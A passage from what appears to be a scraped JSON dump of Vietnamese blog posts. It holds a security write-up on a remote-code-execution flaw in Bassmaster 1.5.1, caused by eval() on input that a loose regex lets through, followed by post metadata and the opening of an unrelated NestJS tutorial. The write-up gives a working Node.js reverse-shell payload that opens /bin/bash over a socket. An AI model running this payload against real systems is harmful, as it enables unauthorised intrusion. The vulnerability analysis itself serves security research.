v\u00e0 c\u00f9ng th\u1ef1c h\u00e0nh khai th\u00e1c sau khi \u0111\u00e3 hi\u1ec3u v\u1ea5n \u0111\u1ec1.\n\nkhi t\u00ecm hi\u1ec3u c\u00f4ng ngh\u1ec7 m\u1edbi, \u0111i\u1ec1u \u0111\u1ea7u ti\u00ean l\u00e0 t\u00ecm hi\u1ec3u n\u00f3 l\u00e0 c\u00e1i g\u00ec? V\u00e0 d\u00f9ng \u0111\u1ec3 l\u00e0m g\u00ec?\n\n> Bassmaster makes it easy to combine requests into a single one. It also supports pipelining, allowing you to take the result of one query in the batch request and use it in a subsequent one. The batch endpoint only responds to POST requests.\n\nTr\u00ean l\u00e0 ph\u1ea7n t\u1ef1 gi\u1edbi thi\u1ec7u v\u1ec1 s\u1ea3n ph\u1ea9m c\u1ee7a bassmaster. Hi\u1ec3u n\u00f4m na l\u00e0 bassmaster cho ph\u00e9p ta th\u1ef1c hi\u1ec7n g\u1ed9p nhi\u1ec1u requests trong m\u1ed9t requests. Ta c\u1ee9 h\u00ecnh dung nh\u01b0 thay v\u00ec \u0111\u01b0a t\u1eebng chi\u1ebfc \u0111\u0169a m\u1ed9t th\u00ec ta \u0111\u01b0a c\u1ea3 b\u00f3 \u0111\u0169a cho ng\u01b0\u1eddi kh\u00e1c.\n\n# T\u00ecm l\u1ed7i RCE\nBassmaster code b\u1eb1ng nodejs v\u00e0 trong version 1.5.1 t\u1ed3n t\u1ea1i l\u1ed7 h\u1ed5ng RCE cho ph\u00e9p k\u1ebb t\u1ea5n c\u00f4ng th\u1ef1c thi m\u00e3 t\u00f9y \u00fd tr\u00ean server. Do source \u0111\u00e3 c\u00f3 s\u1eb5n n\u00ean ta s\u1ebd \u0111i v\u00e0o ph\u00e2n t\u00edch code \u0111\u1ec3 t\u00ecm ra l\u1ed7 h\u1ed5ng. Nh\u01b0 \u0111\u00e3 n\u00f3i \u1edf tr\u00ean, bassmaster code b\u1eb1ng nodejs n\u00ean ta s\u1ebd t\u00ecm nh\u1eefng h\u00e0m c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng \u0111\u1ec3 th\u1ef1c thi m\u00e3 tr\u00ean server nh\u01b0 l\u00e0 **eval**. C\u00e1ch \u0111\u01a1n gi\u1ea3n nh\u1ea5t trong t\u00ecm c\u00e1c h\u00e0m nguy hi\u1ec3m l\u00e0 s\u1eed d\u1ee5ng grep \u0111\u1ec3 t\u00ecm ki\u1ebfm.\n\n```bash\ngrep --color -rnw ./\n```\n\n![](https://images.viblo.asia/f423cf6b-e964-44e4-bd20-5b0a36c96de5.png)\n\nNh\u01b0 k\u1ebft qu\u1ea3 \u1edf tr\u00ean h\u00ecnh, ta th\u1ea5y c\u00f3 v\u00e0i k\u1ebft qu\u1ea3 kh\u1ea3 nghi nh\u01b0ng ta th\u1ea5y k\u1ebft qu\u1ea3 \u0111\u1ea7u ti\u00ean l\u00e0 c\u00f3 v\u00e8 \u0111\u00e1ng ng\u1edd nh\u1ea5t. Do \u0111\u00f3, ta s\u1ebd \u0111i v\u00e0o ph\u1ea7n t\u00edch file **./lib/batch.js** v\u00e0 s\u1ebd b\u1eaft \u0111\u1ea7u t\u1eeb d\u00f2ng **152**.\n```javascript\ninternals.batch = function (batchRequest, resultsData, pos, parts, callback) {\n    var error = null;\n\n    for (var i = 0, il = parts.length; i < il; ++i) {\n        path += '/';\n\n        if (parts[i].type === 'ref') {\n            var ref = resultsData.resultsMap[parts[i].index];\n\n            if (ref) {\n                var value = null;\n\n                try {\n                    eval('value = ref.' + parts[i].value + ';');\n                }\n                catch (e) {\n                    error = new Error(e.message);\n                }\n                ...\n```\n\nH\u00e0m **eval** n\u1eb1m trong nh\u00e1nh **TRUE** c\u00e2u l\u1ec7nh **if..else** v\u00ec v\u1eady mu\u1ed1n th\u1ef1c thi \u0111\u01b0\u1ee3c h\u00e0m n\u00e0y c\u1ea7n ph\u1ea3i bi\u1ebft \u0111\u01b0\u1ee3c khi n\u00e0o th\u00ec ch\u01b0\u01a1ng tr\u00ecnh \u0111i v\u00e0o nh\u00e1nh **TRUE**. Ta \u0111\u1ec3 \u00fd th\u1ea5y **internals.batch** \u0111\u01b0\u1ee3c g\u00e1n b\u1eb1ng h\u00e0m ch\u1ee9a l\u1ec7nh **eval**, do \u0111\u00f3 ta trace ng\u01b0\u1ee3c code xem c\u00f3 n\u01a1i n\u00e0o g\u1ecdi **internals.batch**. Khi \u0111i ng\u01b0\u1ee3c l\u00ean tr\u00ean ta th\u1ea5y ngay l\u1eddi g\u1ecdi **internals.batch** n\u1eb1m trong \u0111o\u1ea1n code sau\n```javascript\ninternals.process = function (request, requests, resultsData, reply) {\n\n    var fnsParallel = [];\n    var fnsSerial = [];\n    var callBatch = function (pos, parts) {\n\n        return function (callback) {\n            //console.log(\"calling the batch function!\");\n            internals.batch(request, resultsData, pos, parts, callback);\n        };\n    };\n\n    for (var i = 0, il = requests.length; i < il; ++i) {\n        var parts = requests[i];\n\n        if (internals.hasRefPart(parts)) {\n            fnsSerial.push(callBatch(i, parts));\n        }\n        else {\n            fnsParallel.push(callBatch(i, parts));\n        }\n    }\n...\n```\n\nN\u01a1i g\u1ecdi h\u00e0m **internals.batch** l\u00e0 h\u00e0m **internals.process**, ta ti\u1ebfp t\u1ee5c trace ti\u1ebfp \u0111\u1ec3 t\u00ecm \u0111\u01b0\u1ee3c n\u01a1i g\u1ecdi h\u00e0m **internals.process**. Sau khi \u0111i l\u00ean m\u1ed9t \u0111o\u1ea1n ta \u0111\u00e3 th\u1ea5y ngay \u0111\u01b0\u1ee3c l\u1eddi g\u1ecdi h\u00e0m **internals.process** n\u1eb1m trong **module.exports.config**\n```javascript\nmodule.exports.config = function (settings) {\n\n    return {\n        handler: function (request, reply) {\n\n            var resultsData = {\n                results: [],\n                resultsMap: []\n            };\n\n            var requests = [];\n            var requestRegex = /(?:\\/)(?:\\$(\\d)+\\.)?([^\\/\\$]*)/g;       // /project/$1.project/tasks, does not allow using array responses\n\n            // Validate requests\n\n            var errorMessage = null;\n            var parseRequest = function ($0, $1, $2) {\n\n                if ($1) {\n                    if ($1 < i) {\n                        parts.push({ type: 'ref', index: $1, value: $2 });\n                        return '';\n                    }\n                    else {\n                        errorMessage = 'Request reference is beyond array size: ' + i;\n                        return $0;\n                    }\n                }\n                else {\n                    parts.push({ type: 'text', value: $2 });\n                    return '';\n                }\n            };\n\n            if (!request.payload.requests) {\n                return reply(Boom.badRequest('Request missing requests array'));\n            }\n\n            for (var i = 0, il = request.payload.requests.length; i < il; ++i) {\n\n                // Break into parts\n\n                var parts = [];\n                var result = request.payload.requests[i].path.replace(requestRegex, parseRequest);\n\n                // Make sure entire string was processed (empty)\n\n                if (result === '') {\n                    requests.push(parts);\n                }\n                else {\n                    errorMessage = errorMessage || 'Invalid request format in item: ' + i;\n                    break;\n                }\n            }\n\n            if (errorMessage === null) {\n                internals.process(request, requests, resultsData, reply);\n            }\n            else {\n                reply(Boom.badRequest(errorMessage));\n            }\n        },\n        description: settings.description,\n        tags: settings.tags\n    };\n};\n```\n\nTa nh\u1eadn th\u1ea5y r\u1eb1ng \u0111\u1ec3 c\u00f3 th\u1ec3 g\u1ecdi h\u00e0m **internals.process** th\u00ec **errorMessage** ph\u1ea3i b\u1eb1ng **null**. Bi\u1ebfn **errorMessage** \u0111\u01b0\u1ee3c g\u00e1n trong v\u00f2ng l\u1eb7p khi ph\u00e1t hi\u1ec7n l\u1ed7i v\u00e0 trong h\u00e0m **parseRequest** khi URL kh\u00f4ng h\u1ee3p l\u1ec7. Trong v\u00f2ng l\u1eb7p for g\u1ecdi h\u00e0m **replace** v\u1edbi 2 tham s\u1ed1, tham s\u1ed1 \u0111\u1ea7u l\u00e0 pattern, tham s\u1ed1 th\u1ee9 2 l\u00e0 h\u00e0m x\u1eed l\u00fd sau khi kh\u1edbp chu\u1ed7i v\u1edbi pattern.\n\n## H\u00e0m replace\n\u0110\u1ec3 hi\u1ec3u h\u01a1n v\u1ec1 lu\u1ed3ng th\u1ef1c thi c\u1ee7a ch\u01b0\u01a1ng tr\u00ecnh c\u1ea7n ph\u1ea3i ph\u00e2n t\u00edch r\u00f5 h\u01a1n v\u1ec1 ho\u1ea1t \u0111\u1ed9ng c\u1ee7a h\u00e0m replace. \u0110\u1eb7c bi\u1ec7t l\u00e0 tr\u01b0\u1eddng h\u1ee3p tham s\u1ed1 th\u1ee9 1 l\u00e0 m\u1ed9t chu\u1ed7i regex v\u00e0 tham s\u1ed1 th\u1ee9 2 l\u00e0 m\u1ed9t h\u00e0m. Sau khi \u0111\u1ecdc t\u00e0i li\u1ec7u v\u1ec1 h\u00e0m n\u00e0y tr\u00ean MDN ([**link**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#Specifying_a_function_as_a_parameter)) li\u1ec1n hi\u1ec3u ra r\u1eb1ng, h\u00e0m chuy\u1ec1n v\u00e0o s\u1ebd \u0111\u01b0\u1ee3c g\u1ecdi sau khi th\u1ef1c hi\u1ec7n kh\u1edbp chu\u1ed7i ban \u0111\u1ea7u v\u1edbi chu\u1ed7i regex v\u00e0 k\u1ebft qu\u1ea3 s\u1ebd chuy\u1ec1n v\u00e0o cho tham th\u00f4ng qua c\u00e1c tham s\u1ed1 c\u1ee7a h\u00e0m.\n\n> You can specify a function as the second parameter. In this case, the function will be invoked after the match has been performed. The function's result (return value) will be used as the replacement string. \n\n> Note that the function will be invoked multiple times for each full match to be replaced if the regular expression in the first parameter is global.\n\nTham s\u1ed1 truy\u1ec1n v\u00e0o cho h\u00e0m \u0111\u01b0\u1ee3c m\u00f4 t\u1ea3 trong b\u1ea3ng sau\n![](https://images.viblo.asia/95f35fe7-af28-45a9-9a9a-20e038acd3db.png)\n\nPh\u1ea7n code c\u1ee7a bassmaster\n```javascript\nvar parseRequest = function ($0, $1, $2) {\n```\n\u0110\u1ed1i chi\u1ebfu v\u1edbi b\u1ea3ng b\u00ean tr\u00ean ta c\u00f3 th\u1ec3 hi\u1ec3u \u0111\u01b0\u1ee3c \u00fd ngh\u0129a c\u00e1c tham s\u1ed1: **$0**, **$1**, **$2**\n+ **$0**: To\u00e0n b\u1ed9 chu\u1ed7i kh\u1edbp v\u1edbi regex\n+ **$1**: chu\u1ed7i group 1\n+ **$2**: chu\u1ed7i group 2\n\nTa \u0111\u1ec3 \u00fd v\u00e0o h\u00e0m **parseRequest**, \u0111\u00e2y l\u00e0 h\u00e0m cu\u1ed1i c\u00f9ng c\u00f3 g\u00e1n gi\u00e1 tr\u1ecb **type: 'ref'** v\u00e0o k\u1ebft qu\u1ea3 v\u00e0 l\u00e0 \u0111i\u1ec1u ki\u1ec7n th\u1ef1c thi \u0111\u01b0\u1ee3c h\u00e0m **eval**.\n\n```javascript\nparts.push({ type: 'ref', index: $1, value: $2 });\n```\n\n\u0110\u1ec3 c\u00f3 th\u1ec3 th\u00eam **type: 'ref'** th\u00ec **$1** ph\u1ea3i kh\u00e1c **null**, m\u00e0 **$1** l\u00e0 group 1 c\u1ee7a regex. Khi ta truy\u1ec1n d\u1eef li\u1ec7u nh\u01b0 d\u01b0\u1edbi v\u00e0o th\u00ec **$1** s\u1ebd kh\u00e1c **null**\n```javascript\n/item/$1.id\n```\n\nSau khi \u0111\u00e3 th\u00eam **type: 'ref'** v\u00e0 parts th\u00ec ta \u0111\u00e3 c\u00f3 th\u1ec3 th\u1ef1c hi\u1ec7n \u0111\u01b0\u1ee3c h\u00e0m **eval**.\n```javascript\neval('value = ref.' + parts[i].value + ';');\n```\n**value** \u0111\u01b0\u1ee3c g\u00e1n b\u1eb1ng **$2** (ch\u00ednh l\u00e0 group 2 c\u1ee7a regex) \u1edf tr\u00ean. Khi ta truy\u1ec1n `/item/$1.id` th\u00ec **value** \u1edf \u0111\u00e2y l\u00e0 `id`\n\n## Regex s\u1eed d\u1ee5ng kh\u00f4ng ch\u1eb7t ch\u1ebd\nBassmaster \u0111\u00e3 s\u1eed d\u1ee5ng regex \u0111\u1ec3 l\u1ecdc nh\u1eefng path h\u1ee3p l\u1ec7. Nh\u01b0ng Regex n\u00e0y kh\u00f4ng \u0111\u1ee7 ch\u1eb7t ch\u1ebd, cho ph\u00e9p ng\u01b0\u1eddi d\u00f9ng bypass t\u1eeb \u0111\u00f3 c\u00f3 th\u1ec3 th\u1ef1c thi m\u00e3 t\u00f9y \u00fd tr\u00ean server. Do \u0111\u00f3 ta s\u1ebd \u0111i v\u00e0o ph\u00e2n t\u00edch pattern m\u00e0 bassmaster \u0111\u00e3 s\u1eed d\u1ee5ng.\n```regex\n/(?:\\/)(?:\\$(\\d)+\\.)?([^\\/\\$]*)/g\n```\nM\u1ee5c \u0111\u00edch c\u1ee7a regex b\u00ean tr\u00ean \u0111\u00e3 \u0111\u01b0\u1ee3c n\u00f3i r\u00f5 trong source code\n> /project/$1.project/tasks, does not allow using array\n\n\nData g\u1eedi l\u00ean server theo ki\u1ec3u json v\u00e0 c\u00f3 d\u1ea1ng nh\u01b0 sau (m\u1eabu l\u1ea5y t\u1eeb trong file **example/batch.js**)\n```text\npayload: '{ \"requests\": [{ \"method\": \"get\", \"path\": \"/profile\" }, { \"method\": \"get\", \"path\": \"/item\" }, { \"method\": \"get\", \"path\": \"/item/$1.id\" }] }'\n```\n\n![](https://images.viblo.asia/f603bc05-d0ce-4e64-9c8a-13fae0c00a19.png)\n\nNh\u01b0 \u0111\u00e3 n\u00f3i b\u00ean tr\u00ean n\u1ebfu ta truy\u1ec1n th\u00ec h\u00e0m **eval** s\u1ebd nh\u1eadn chu\u1ed7i **id** l\u00e0m tham s\u1ed1.\n```regex\n/item/$1.id\n```\n\n![](https://images.viblo.asia/433ca9cf-2894-4235-a22c-762af7be5f09.png)\n\nV\u1ea5n \u0111\u1ec1 \u0111\u1eb7t ra l\u00e0 n\u1ebfu ta c\u00f3 ch\u00e8n th\u00eam c\u00e1c gi\u00e1 tr\u1ecb kh\u00e1c th\u00ec ta c\u00f3 th\u1ec3 th\u1ef1c thi m\u00e3 t\u00f9y \u00fd. Trong javascript, ng\u0103n c\u00e1ch gi\u1eef c\u00e1c c\u00e2u l\u1ec7nh ta s\u1eed d\u1ee5ng d\u1ea5u ch\u1ea5m ph\u1ea9y (**;**) n\u00ean ta s\u1ebd s\u1eed d\u1ee5ng n\u00f3 \u0111\u1ec3 bypass regex t\u1eeb \u0111\u00f3 c\u00f3 th\u1ec3 th\u1ef1c thi m\u00e3 javascript.\n\n```javascript\n;var net=require('net'), sh=require('child_process').exec('\\\\x2fbin\\\\x2fbash');var client=new net.Socket();client.connect(2222,'127.0.0.1',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});\n```\n\n![](https://images.viblo.asia/637a0747-bf9e-4a03-8c18-0760bd9a4654.png)\n\nV\u1edbi \u0111o\u1ea1n m\u00e3 javascript tr\u00ean th\u00ec \u0111\u00e3 \u0111\u00e3 c\u00f3 th\u1ec3 bypass regex v\u00e0 th\u1ef1c hi\u1ec7n \u0111\u01b0\u1ee3c reverse shell.\n\n![](https://images.viblo.asia/490de4b5-7c57-450b-828b-d8adcc6a1fa1.png)\n\nS\u1eed d\u1ee5ng m\u00e3 khai th\u00e1c b\u00ean tr\u00ean \u0111\u00e3 th\u00e0nh c\u00f4ng t\u1ea1o reverse shell.\n\n![](https://images.viblo.asia/e213379c-d758-446d-82da-8de4e3f0ed9f.png)",
      published_at: "2020-11-30 11:42:19",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-19 18:00:16",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 7,
      points: 3,
      views_count: 221,
      clips_count: 1,
      comments_count: 2,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/8c953486-884e-4799-9dea-c979b3653299.png",
      user: {
        data: {
          id: 34742,
          url: "https://viblo.asia/u/com0tf3",
          avatar: "b223a092-6d63-4a8f-89ba-64dc5f4cead0.png",
          name: "cmOs",
          username: "com0tf3",
          followers_count: 34,
          reputation: 923,
          posts_count: 24,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "cyber-security",
            name: "cyber security",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=cyber+security&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "rce",
            name: "RCE",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=RCE&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "hacking",
            name: "hacking",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=hacking&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 27737,
            url: "https://viblo.asia/u/nguyenmanh97",
            avatar: "54df38ab-a685-4bee-ae02-68b4d9eb9954.jpg",
            name: "Nguy\u1ec5n M\u1ea1nh",
            username: "nguyenmanh97",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 34742,
            url: "https://viblo.asia/u/com0tf3",
            avatar: "b223a092-6d63-4a8f-89ba-64dc5f4cead0.png",
            name: "cmOs",
            username: "com0tf3",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
      organization: {
        data: {
          id: 88,
          name: "Sun* Cyber Security Team",
          user_id: 16,
          avatar: "6fba9e20-cbb1-4b63-aa36-c0e5664d19d1.png",
          slug: "sun-cyber-security-team",
          following: false,
          followers_count: 212,
          location: "Sun* R&D Unit",
          posts_count: 149,
          website: null,
          website_verified: false,
          members_count: 10,
          google_analytics_id: null,
          short_description: "Let's hack all the things!",
          full_description:
            "###  Who we are?\n\nWe're __Sun*$hell__, Cyber Security Research Team (SunCSR) of R&D Unit @ Sun* Inc.\n\n### What do we do?\n- Pentesting web/Android/iOS apps\n- Security Audit\n- Find \ud83d\udc1e and report vulnerabilities\n- Improve the security of Sun Asterisk\u2019s web/app \n- Research new vulnerabilities\n- Play CTF \ud83c\uddfb\ud83c\uddf3\n\n### [CTFtime](https://ctftime.org/team/81906)\n\n### [Join us!](https://research.sun-asterisk.com/en/join-us)",
          approved: true,
        },
      },
    },
    {
      id: 48807,
      title: "T\u00ecm hi\u1ec3u v\u1ec1 NestJS (Ph\u1ea7n 1)",
      slug: "3P0lP0ymlox",
      url: "https://viblo.asia/p/tim-hieu-ve-nestjs-phan-1-3P0lP0ymlox",
      user_id: 44193,
      moderation: null,
      transliterated: "tim-hieu-ve-nestjs-phan-1",
      contents_short:
        "N\u1ebfu \u0111\u00e3 t\u1eebng ph\u00e1t tri\u1ec3n NodeJS Server App th\u00ec ch\u1eafc c\u00e1c b\u1ea1n c\u0169ng kh\u00f4ng c\u00f2n xa l\u1ea1 g\u00ec v\u1edbi 2 framwork n\u1ed5i ti\u1ebfng l\u00e0 Express v\u00e0 Fastify. V\u1ec1 c\u01a1 b\u1ea3n th\u00ec m\u00ecnh th\u1ea5y 2 framework n\u00e0y \u0111ang th\u1ef1c hi\u1ec7n kh\u00e1 t\u1ed1t tron...",
      contents:
        "N\u1ebfu \u0111\u00e3 t\u1eebng ph\u00e1t tri\u1ec3n NodeJS Server App th\u00ec ch\u1eafc c\u00e1c b\u1ea1n c\u0169ng kh\u00f4ng c\u00f2n xa l\u1ea1 g\u00ec v\u1edbi 2 framwork n\u1ed5i ti\u1ebfng l\u00e0 [Express](https://expressjs.com/) v\u00e0 [Fastify](https://www.fastify.io/). V\u1ec1 c\u01a1 b\u1ea3n th\u00ec m\u00ecnh th\u1ea5y 2 framework n\u00e0y \u0111ang th\u1ef1c hi\u1ec7n kh\u00e1 t\u1ed1t trong vi\u1ec7c ph\u00e1t tri\u1ec3n server-side, tuy nhi\u00ean ch\u00fang c\u0169ng khi\u1ebfn cho c\u00e1c nh\u00e0 ph\u00e1t tri\u1ec3n ph\u1ea3i suy ngh\u0129 kh\u00e1 nhi\u1ec1u trong vi\u1ec7c l\u00e0m sao \u0111\u1ec3 x\u00e2y d\u1ef1ng m\u1ed9t project  v\u1edbi clean structure, highly scalable, testable v\u00e0 d\u1ec5 d\u00e0ng maintaince. \u0110\u1eb7c bi\u1ec7t l\u00e0 m\u1ed9t l\u1eadp tr\u00ecnh vi\u00ean m\u1edbi b\u1eaft \u0111\u1ea7u v\u1edbi NodeJS th\u00ec ch\u1eafc h\u1eb3n \u0111\u00e2y s\u1ebd l\u00e0 m\u1ed9t v\u1ea5n \u0111\u1ec1. N\u1ebfu build t\u1ed1t ngay t\u1eeb \u0111\u1ea7u khi \u0111\u1ebfn m\u1ed9t giai \u0111o\u1ea1n n\u00e0o \u0111\u00f3 ch\u00fang ta s\u1ebd t\u1ed1n kh\u00e1 nhi\u1ec1u chi ph\u00ed ph\u00e1t tri\u1ec3n c\u0169ng nh\u01b0 maintaince. [NestJS](https://nestjs.com/) \u0111\u01b0\u1ee3c t\u1ea1o ra \u0111\u1ec3 gi\u00fap ch\u00fang ta ph\u1ea7n n\u00e0o \u0111\u00f3 gi\u1ea3i quy\u1ebft \u0111\u01b0\u1ee3c v\u1ea5n \u0111\u1ec1 n\u00e0y. Trong b\u00e0i vi\u1ebft n\u00e0y m\u00ecnh v\u00e0 c\u00e1c b\u1ea1n s\u1ebd c\u00f9ng t\u00ecm hi\u1ec3u qua v\u1ec1 NestJS nh\u00e9.\n\n## 1. NestJS l\u00e0 g\u00ec?\nNestJS l\u00e0 m\u1ed9t NodeJS framework d\u00f9ng \u0111\u1ec3 ph\u00e1t tri\u1ec3n server-side applications hi\u1ec7u qu\u1ea3 v\u00e0 c\u00f3 th\u1ec3 m\u1edf r\u1ed9ng. NestJS l\u00e0 s\u1ef1 k\u1ebft h\u1ee3p b\u1edfi OOP(Object Oriented Programming), FP(Functional Programming), FRP(Functional Reactive Programming). NestJS s\u1eed d\u1ee5ng TypeScript \u0111\u1ec3 ph\u00e1t tri\u1ec3n nh\u01b0ng n\u00f3 c\u0169ng h\u1ed7 tr\u1ee3 c\u1ea3 Javascript. V\u00ec v\u1eady b\u1ea1n kh\u00f4ng c\u1ea7n ph\u1ea3i lo l\u1eafng vi\u1ec7c m\u00ecnh kh\u00f4ng th\u1ec3 l\u00e0m t\u1ed1t NestJS v\u00ec kh\u00f4ng bi\u1ebft TypeScript.\n\nNest \u0111\u01b0\u1ee3c l\u1ea5y c\u1ea3m h\u1ee9ng t\u1eeb ki\u1ebfn tr\u00fac Agular n\u00ean v\u1edbi c\u00e1c b\u1ea1n \u0111\u00e3 l\u00e0m vi\u1ec7c v\u1edbi Agular th\u00ec ch\u1eafc h\u1eb3n s\u1ebd kh\u00f4ng c\u00f2n xa l\u1ea1 g\u00ec v\u00e0 c\u00f3 th\u1ec3 d\u1ec5 d\u00e0ng ti\u1ebfp c\u1eadn.\n\nTin vui v\u1edbi c\u00e1c l\u1eadp tr\u00ecnh vi\u00ean y\u00eau th\u00edch Express hay Fastify l\u00e0 Nest cho ph\u00e9p t\u00edch h\u1ee3p s\u1eed d\u1ee5ng Express v\u00e0 Fastify nh\u01b0 m\u1ed9t middleware. N\u00f3 \u0111\u01b0\u1ee3c \u0111\u00f3ng g\u00f3i trong 2 package c\u1ee7a npm l\u00e0 [platform-express](https://www.npmjs.com/package/@nestjs/platform-express) v\u00e0 [platform-fastify](https://www.npmjs.com/package/@nestjs/platform-fastify)\n\nQuan tr\u1ecdng h\u01a1n, n\u00f3 bu\u1ed9c c\u00e1c nh\u00e0 ph\u00e1t tri\u1ec3n s\u1eed d\u1ee5ng m\u1ed9t ki\u1ebfn tr\u00fac c\u1ee5 th\u1ec3 b\u1eb1ng c\u00e1ch gi\u1edbi thi\u1ec7u c\u00e1c module, provider v\u00e0 controller, \u0111\u1ea3m b\u1ea3o \u1ee9ng d\u1ee5ng highly scalable, testable v\u00e0 d\u1ec5 d\u00e0ng maintaince. Nest r\u1ea5t kh\u1eaft khe v\u00e0 ch\u1eb7t ch\u1ebd trong vi\u1ec7c x\u00e2y d\u1ef1ng c\u1ea5u tr\u00fac project. V\u00ec v\u1eady h\u00e3y tu\u00e2n th\u1ee7 theo n\u00f3\n\n## 2. V\u00ec sao s\u1eed d\u1ee5ng NestJS?\n\nNh\u01b0 m\u00ecnh \u0111\u00e3 n\u00f3i \u1edf tr\u00ean, kh\u00f4ng c\u00f3 m\u1ed9t ki\u1ebfn tr\u00fac ti\u00eau chu\u1ea9n n\u00e0o cho c\u00e1c d\u1ef1 \u00e1n NodeJS v\u1edbi Express ho\u1eb7c Fastify hi\u1ec7n t\u1ea1i. M\u1ed7i d\u1ef1 \u00e1n \u0111\u1ec1u c\u00f3 m\u1ed9t ki\u1ebfn tr\u00fac ph\u00f9 h\u1ee3p kh\u00e1c nhau nh\u01b0 MVC, ki\u1ebfn tr\u00fac th\u00e0nh ph\u1ea7n ho\u1eb7c c\u00e1c ki\u1ebfn tr\u00fac kh\u00e1c. V\u1edbi m\u1ed9t nh\u00e0 ph\u00e1t tri\u1ec3n m\u1edbi l\u00e0m vi\u1ec7c v\u1edbi NodeJS th\u00ec h\u1ecd s\u1ebd kh\u00f4ng c\u00f3 t\u01b0 duy v\u1ec1 architecture, scable hay maintainable th\u00ec trong qu\u00e1 tr\u00ecnh ph\u00e1t tri\u1ec3n c\u00f3 th\u1ec3 g\u00e2y ra vi\u1ec7c t\u1ea1o ra ki\u1ebfn tr\u00fac code kh\u00f4ng ch\u1ea5t l\u01b0\u1ee3ng l\u00e0m x\u00e1o tr\u1ed9n d\u1ef1 \u00e1n. NestJS cung c\u1ea5p cho ch\u00fang ta m\u1ed9t ki\u1ebfn tr\u00fac c\u1ee5 th\u1ec3 v\u00e0 r\u00f5 d\u00e0ng \u0111\u1ec3 gi\u1ea3i quy\u1ebft v\u1ea5n \u0111\u1ec1 n\u00e0y.\n\nC\u00f2n v\u1edbi perfomance, v\u00ec ch\u01b0a c\u00f3 d\u1ef1 \u00e1n l\u1edbn th\u1ef1c t\u1ebf n\u00e0o v\u1edbi NestJS n\u00ean m\u00ecnh kh\u00f4ng th\u1ec3 \u0111\u00e1nh gi\u00e1 \u0111\u01b0\u1ee3c n\u00f3. M\u00ecnh c\u00f3 tham kh\u1ea3o qua c\u1ed9ng \u0111\u1ed9ng developer Nest th\u00ec c\u00f3 tham kh\u1ea3o \u0111\u01b0\u1ee3c d\u01b0\u1edbi \u0111\u1ea5y. C\u00e1c b\u1ea1n xem qua nh\u00e9:.\n![](https://images.viblo.asia/6cd0fa05-d1c5-4ac9-85b6-74e45ed8b7c5.png)\n\n## 3. C\u00e1c th\u00e0nh ph\u1ea7n quan tr\u1ecdng trong NestJS\n\nTr\u01b0\u1edbc khi t\u00ecm hi\u1ec3u c\u00e1c th\u00e0nh ph\u1ea7n trong Nest th\u00ec ch\u00fang ta s\u1ebd c\u00e0i Nest CLI \u0111\u1ec3 t\u1ea1o m\u1ed9t project Nest nh\u00e9. \n\n```\nnpm i -g @nestjs/cli\n```\n\n```\nnest new project-name\n```\n\nSau khi ch\u1ea1y 2 l\u1ec7nh tr\u00ean ta s\u1ebd c\u00f3 m\u1ed9t source code v\u1edbi c\u1ea5u tr\u00fac nh\u01b0 sau:\n\n![](https://images.viblo.asia/c9b434cd-bb2b-4c88-b8a9-27cd3bc70949.png)\n\nM\u00ecnh s\u1ebd gi\u1ea3i th\u00edch \u0111\u00f4i ch\u00fat v\u1ec1 c\u00e1c th\u00e0nh ph\u1ea7n tr\u00ean\n\n* app.controller.ts: Ch\u1ee9a c\u00e1c router \u0111\u1ec3 x\u1eed l\u00fd c\u00e1c request v\u00e0 tr\u1ea3 v\u1ec1 response cho client.\n\n* app.controller.spec.ts: C\u00f3 nhi\u1ec7m v\u1ee5 vi\u1ebft unit-test cho c\u00e1c controller.\n\n* app.module.ts: Root module c\u1ee7a \u1ee9ng d\u1ee5ng.\n\n* app.service.ts: Service ch\u1ee9a c\u00e1c logic m\u00e0 controller s\u1ebd d\u00f9ng \u0111\u1ebfn.\n\n* main.ts: S\u1eed d\u1ee5ng NestFactory \u0111\u1ec3 kh\u1edfi t\u1ea1o \u1ee9ng d\u1ee5ng.\n\n\nV\u1ec1 c\u01a1 b\u1ea3n th\u00ec main.ts s\u1ebd s\u1eed d\u1ee5ng static method create() c\u1ee7a NestFactory \u0111\u1ec3 t\u1ea1o server app nh\u01b0 sau:\n\n```\nimport { NestFactory } from '@nestjs/core';\nimport { AppModule } from './app.module';\n\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule);\n  await app.listen(3000);\n}\nbootstrap();\n```\n\nNgo\u00e0i ra, NestJS khuy\u1ebfn kh\u00edch ch\u00fang ta n\u00ean tu\u00e2n th\u1ee7 theo c\u1ea5u tr\u00fac project nh\u01b0 sau \u0111\u1ec3 lu\u00f4n gi\u1eef cho m\u00e3 s\u1ea1ch, t\u00e1i s\u1eed d\u1ee5ng, \u0111\u1ed9c l\u1eadp v\u00e0 kh\u1ea3 n\u0103ng m\u1edf r\u1ed9ng cao,...\n\n![](https://images.viblo.asia/55e76541-b477-4b79-abef-6961e7599c5c.png)\n\n\n### Module\n\n![](https://images.viblo.asia/13526c5b-6edc-481e-a040-3e9a0639d178.png)\n\nModule c\u00f3 nhi\u1ec7m v\u1ee5 \u0111\u00f3ng g\u00f3i nh\u1eefng logic li\u00ean quan c\u1ee7a c\u00e1c ch\u1ee9c n\u0103ng 